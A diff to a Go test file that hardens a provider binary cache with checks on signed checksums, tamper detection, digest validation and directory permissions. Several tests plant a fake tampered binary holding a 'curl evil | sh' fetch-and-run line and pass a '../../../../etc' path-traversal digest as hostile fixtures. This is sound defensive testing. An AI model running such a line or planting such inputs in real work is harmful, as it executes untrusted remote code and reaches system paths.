@@ -61,6 +61,19 @@ type release struct {
 	requests atomic.Int32
 	statuses map[string][]int
 	auth     atomic.Value
+	unsigned atomic.Bool
+	altered  atomic.Bool
+}
+
+func countersigned(checksums, identity string) []byte {
+	return fmt.Appendf(nil, "%s signs %s", identity, digestOf([]byte(checksums)))
+}
+
+func countersigns(checksums, signature []byte, identity string) error {
+	if want := countersigned(string(checksums), identity); !bytes.Equal(signature, want) {
+		return fmt.Errorf("%s carries %q, want %q", SignatureAsset, signature, want)
+	}
+	return nil
 }
 
 func fakeRelease(t *testing.T, names ...string) *release {
@@ -94,8 +107,20 @@ func fakeRelease(t *testing.T, names ...string) *release {
 			w.WriteHeader(status)
 			return
 		}
-		if asset == "checksums.txt" {
-			_, _ = w.Write([]byte(checksums.String()))
+		if asset == ChecksumsAsset {
+			body := checksums.String()
+			if rel.altered.Load() {
+				body += digestOf([]byte("evil")) + "  ocel-provider-evil_" + testVersion + "_linux_amd64.tar.gz\n"
+			}
+			_, _ = w.Write([]byte(body))
+			return
+		}
+		if asset == SignatureAsset {
+			if rel.unsigned.Load() {
+				w.WriteHeader(http.StatusNotFound)
+				return
+			}
+			_, _ = w.Write(countersigned(checksums.String(), SignerIdentity(testVersion)))
 			return
 		}
 		body, held := rel.archives[asset]
@@ -119,6 +144,7 @@ func storeFor(t *testing.T, rel *release) *Store {
 		BaseURL:  rel.server.URL,
 		HTTP:     rel.server.Client(),
 		Sleep:    func(time.Duration) {},
+		Verify:   countersigns,
 	}
 }
 
@@ -144,7 +170,7 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 		t.Fatalf("Binary: %v", err)
 	}
 
-	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", "provider-aws")
+	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", digest, "provider-aws")
 	if path != want {
 		t.Fatalf("Binary() = %q, want %q", path, want)
 	}
@@ -185,6 +211,126 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 
 	if entries, err := os.ReadDir(store.Dir); err != nil || len(entries) != 0 {
 		t.Fatalf("the cache holds %v (err %v), want nothing written", entries, err)
+	}
+}
+
+func TestACachedProviderAlteredAfterItsInstallIsRefetched(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	before := rel.requests.Load()
+	again, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("second Binary: %v", err)
+	}
+	if again != path {
+		t.Fatalf("Binary() = %q, want the same path %q", again, path)
+	}
+	if rel.requests.Load() == before {
+		t.Fatal("an altered cache entry was served without being fetched again")
+	}
+	body, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(body), "evil") {
+		t.Fatalf("the altered provider is still cached: %q", body)
+	}
+}
+
+func TestACachedProviderAlteredAfterItsInstallIsRefusedWhenItCannotBeRefetched(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	rel.server.Close()
+
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err == nil {
+		t.Fatal("Binary() error = nil, want the altered cache entry refused")
+	}
+}
+
+func TestALockPinningAnotherDigestIsNeverServedFromTheCache(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+
+	other := strings.Repeat("a", 64)
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, other)
+	if err == nil {
+		t.Fatal("Binary() error = nil, want the archive the release serves refused against the other pin")
+	}
+	if !strings.Contains(err.Error(), other) {
+		t.Errorf("error %q does not name the digest the lock pins", err.Error())
+	}
+}
+
+func TestADigestThatIsNotASha256IsRefusedRatherThanMadeIntoAPath(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "../../../../etc")
+	if err == nil {
+		t.Fatal("Binary() error = nil, want a digest that is not a sha256 refused")
+	}
+	if rel.requests.Load() != 0 {
+		t.Fatal("the release was reached for a digest that is not a sha256")
+	}
+}
+
+func TestTheProviderCacheIsReadableOnlyByTheUserThatFetchedIt(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	store.Dir = filepath.Join(store.Dir, "providers")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+
+	for dir := filepath.Dir(path); dir != filepath.Dir(store.Dir); dir = filepath.Dir(dir) {
+		info, err := os.Stat(dir)
+		if err != nil {
+			t.Fatalf("stat %s: %v", dir, err)
+		}
+		if got := info.Mode().Perm(); got != 0o700 {
+			t.Errorf("%s is %v, want 0700", dir, got)
+		}
 	}
 }
 
@@ -310,6 +456,60 @@ func TestATokenIsSentAsABearerAgainstTheRateLimit(t *testing.T) {
 	}
 	if got := rel.auth.Load(); got != "Bearer gh-token" {
 		t.Fatalf("Authorization = %v, want a bearer token", got)
+	}
+}
+
+func TestChecksumsAReleaseSignsNothingOverArePinnedNowhere(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	rel.unsigned.Store(true)
+	store := storeFor(t, rel)
+
+	_, err := store.Checksums(context.Background())
+	if err == nil {
+		t.Fatal("Checksums() error = nil, want checksums with no signature beside them refused")
+	}
+	if !strings.Contains(err.Error(), SignatureAsset) {
+		t.Errorf("error %q does not name the signature it looked for", err.Error())
+	}
+}
+
+func TestChecksumsAlteredAfterTheReleaseSignedThemArePinnedNowhere(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	rel.altered.Store(true)
+	store := storeFor(t, rel)
+
+	sums, err := store.Checksums(context.Background())
+	if err == nil {
+		t.Fatal("Checksums() error = nil, want checksums the signature does not cover refused")
+	}
+	if sums != nil {
+		t.Fatalf("Checksums() = %v, want nothing to pin", sums)
+	}
+}
+
+func TestAReleaseSignedByAnotherWorkflowIsPinnedNowhere(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	store.Verify = func(checksums, signature []byte, identity string) error {
+		return countersigns(checksums, signature, "https://github.com/elsewhere/.github/workflows/binaries.yml@refs/tags/v"+testVersion)
+	}
+
+	if _, err := store.Checksums(context.Background()); err == nil {
+		t.Fatal("Checksums() error = nil, want a signature made under another identity refused")
+	}
+}
+
+func TestTheIdentityAReleaseMustBeSignedUnderNamesTheTagBeingRun(t *testing.T) {
+	t.Parallel()
+
+	if got, want := SignerIdentity(testVersion), SignerWorkflow+"@refs/tags/v"+testVersion; got != want {
+		t.Fatalf("SignerIdentity(%q) = %q, want %q", testVersion, got, want)
 	}
 }
 
